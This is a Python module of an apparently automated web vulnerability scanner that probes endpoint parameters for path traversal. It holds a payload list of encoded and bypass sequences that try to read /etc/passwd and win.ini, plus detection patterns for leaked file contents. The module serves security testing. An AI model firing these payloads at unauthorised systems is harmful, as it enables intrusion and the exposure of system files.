# ── dynamic/traversal_injector.py ────────────────────────────────────────────

import requests
from bs4 import BeautifulSoup

import config

# ── Patterns that confirm successful path traversal ───────────────────────────
# Tier 1: actual sensitive file contents leaked into the response.
# Definitive proof the traversal read a file.
FILE_CONTENT_PATTERNS = [
    # Successful file read - Linux
    "root:x:0:0",
    "root:*:0:0",
    "daemon:x:",
    "nobody:x:",
    "bin:x:",
    # Successful file read - Windows
    "[boot loader]",
    "[fonts]",
    "[extensions]",
    "for 16-bit app support",
    "[mci extensions]",
    "[drivers]",
]

# Tier 2: PHP include() error messages. Weak signal on their own —
# ordinary PHP apps emit "failed to open stream" / "no such file or
# directory" on every broken include, even without an injection. They
# only count when the injected payload is ALSO echoed in the response
# (the error message usually prints the attempted path), and when the
# pattern appears more often than in a benign baseline response.
INCLUDE_ERROR_PATTERNS = [
    "for inclusion (include_path=",
    "failed to open stream",
    "no such file or directory",
    "open_basedir restriction",
    "failed opening required",
]

# Fragments present in every traversal payload (raw or URL-encoded),
# used to verify the payload actually reached the file include.
PAYLOAD_MARKERS = ('passwd', 'win.ini', 'boot.ini')

# ── Payload sets ──────────────────────────────────────────────────────────────
TRAVERSAL_PAYLOADS = [
    # Linux /etc/passwd
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd%00",      # null byte
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
    "....//....//....//....//etc/passwd", # double slash bypass
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # full URL encode
    "..%252f..%252f..%252fetc%252fpasswd",        # double encode
    # Windows win.ini
    "../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../boot.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
]

# URLs to skip
SKIP_URLS = [
    'setup.php', 'logout.php', 'phpinfo.php',
    'security.php', 'upload.php', 'brute/',
    'captcha', 'javascript/', 'cryptography',
    'instructions.php',
]


class TraversalInjector:
    """
    Tests each endpoint parameter for Path Traversal by injecting
    directory traversal sequences and checking for sensitive file
    contents (e.g. /etc/passwd, win.ini) in the response.
    """

    def __init__(self, session: requests.Session,
                 scan_manager, auth: dict = None):
        self.session      = session
        self.scan_manager = scan_manager
        self.auth         = auth

    # ── Public entry point ────────────────────────────────────────────────────

    def run(self, endpoints: list) -> list:
        if not self.scan_manager.is_active('traversal'):
            return []

        findings = []
        print("  [Traversal] Starting Path Traversal tests...")

        safe_endpoints = [
            ep for ep in endpoints
            if not any(skip in ep['url'] for skip in SKIP_URLS)
        ]

        total = sum(len(ep['params']) for ep in safe_endpoints)
        print(f"  [Traversal] Testing {total} parameter(s) across "
              f"{len(safe_endpoints)} endpoint(s)...")

        for ep in safe_endpoints:
            for param in ep['params']:
                if param.lower() in ('submit', 'btnsign',
                                     'btnclear', 'send'):
                    continue
                result = self._test_parameter(ep, param)
                if result:
                    findings.append(result)
                    break

        print(f"  [Traversal] Done. Found {len(findings)} "
              f"traversal finding(s).")
        return findings

    # ── Re-authentication ─────────────────────────────────────────────────────

    def _reauth(self):
        if not self.auth:
            return False
        try:
            login_url = self.auth['url']
            resp      = self.session.get(
                login_url, timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True
            )
            soup      = BeautifulSoup(resp.text, 'html.parser')
            post_data = {}
            for h in soup.find_all('input', type='hidden'):
                if h.get('name'):
                    post_data[h['name']] = h.get('value', '')
            post_data[self.auth['username_field']] = self.auth['username']
            post_data[self.auth['password_field']] = self.auth['password']
            for k, v in self.auth.get('extra_fields', {}).items():
                post_data[k] = v
            r = self.session.post(
                login_url, data=post_data,
                timeout=config.REQUEST_TIMEOUT, allow_redirects=True
            )
            if 'login' not in r.url.lower():
                print(f"  [Traversal] Re-authenticated.")
                return True
        except Exception:
            pass
        return False

    # ── Core detection ────────────────────────────────────────────────────────

    def _test_parameter(self, ep: dict, param: str) -> dict:
        """Inject traversal payloads and check for file content patterns."""
        # Baseline body from a benign request: patterns already present
        # in it are page content (docs, always-on error blocks), not
        # evidence. A pattern counts only when it appears MORE times
        # than in the baseline.
        baseline_body = self._get_baseline_body(ep, param)
        for payload in TRAVERSAL_PAYLOADS:
            response = self._send(ep, param, payload)
            if response is None:
                continue

            if self._is_login_page(response):
                print(f"  [Traversal] Session expired, re-authenticating...")
                if self._reauth():
                    response = self._send(ep, param, payload)
                    if response is None or self._is_login_page(response):
                        return None
                else:
                    return None

            body = response.text.lower()

            # Tier 1: sensitive file contents leaked — definitive.
            for pattern in FILE_CONTENT_PATTERNS:
                if body.count(pattern) > baseline_body.count(pattern):
                    print(f"  [Traversal] ✓ Path Traversal: {ep['url']} "
                          f"param='{param}' payload='{payload}'")
                    return self._make_finding(
                        ep       = ep,
                        param    = param,
                        payload  = payload,
                        evidence = f"Sensitive file content detected: "
                                   f"'{pattern}'"
                    )

            # Tier 2: include() error — weak alone. Only counts when the
            # payload is also echoed in the response (error messages
            # print the attempted path), proving the injection reached
            # the file include rather than a pre-existing page error.
            marker = next((m for m in PAYLOAD_MARKERS
                           if m in payload.lower()), None)
            if marker and \
               body.count(marker) > baseline_body.count(marker):
                for pattern in INCLUDE_ERROR_PATTERNS:
                    if body.count(pattern) > baseline_body.count(pattern):
                        print(f"  [Traversal] ✓ Path Traversal: "
                              f"{ep['url']} param='{param}' "
                              f"payload='{payload}'")
                        return self._make_finding(
                            ep       = ep,
                            param    = param,
                            payload  = payload,
                            evidence = f"Include error with injected path "
                                       f"'{pattern}'"
                        )
        return None

    def _get_baseline_body(self, ep: dict, param: str) -> str:
        """
        Lowercased body of a benign request to the same endpoint/param,
        or '' when the endpoint is unreachable / returns a login page.
        """
        benign   = ep['params'].get(param) or '1'
        response = self._send(ep, param, benign)
        if response is None or self._is_login_page(response):
            return ''
        return response.text.lower()

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _is_login_page(self, response) -> bool:
        if response is None:
            return False
        if 'login' in response.url.lower():
            return True
        if 'login.css' in response.text.lower():
            return True
        return False

    def _get_user_token(self, url: str) -> str:
        try:
            resp  = self.session.get(
                url, timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True
            )
            soup  = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            return token['value'] if token else ''
        except Exception:
            return ''

    def _send(self, ep: dict, param: str,
              payload: str) -> requests.Response:
        clean_url = ep['url'].split('#')[0]
        params    = dict(ep['params'])
        params[param] = payload

        if 'user_token' in params:
            params['user_token'] = self._get_user_token(clean_url)

        try:
            if ep['method'] == 'POST':
                return self.session.post(
                    clean_url, data=params,
                    timeout=config.REQUEST_TIMEOUT,
                    allow_redirects=True
                )
            else:
                return self.session.get(
                    clean_url, params=params,
                    timeout=config.REQUEST_TIMEOUT,
                    allow_redirects=True
                )
        except Exception:
            return None

    def _make_finding(self, ep, param,
                      payload, evidence) -> dict:
        return {
            'type'             : 'traversal',
            'owasp'            : 'A01:2025 - Broken Access Control',
            'url'              : ep['url'].split('#')[0],
            'method'           : ep['method'],
            'parameter'        : param,
            'payload'          : payload,
            'technique'        : 'path-traversal',
            'evidence_dynamic' : evidence,
            'evidence_static'  : None,
            'confidence'       : 0.65,
            'module'           : 'dynamic',
            'finding_type'     : 3,
        }
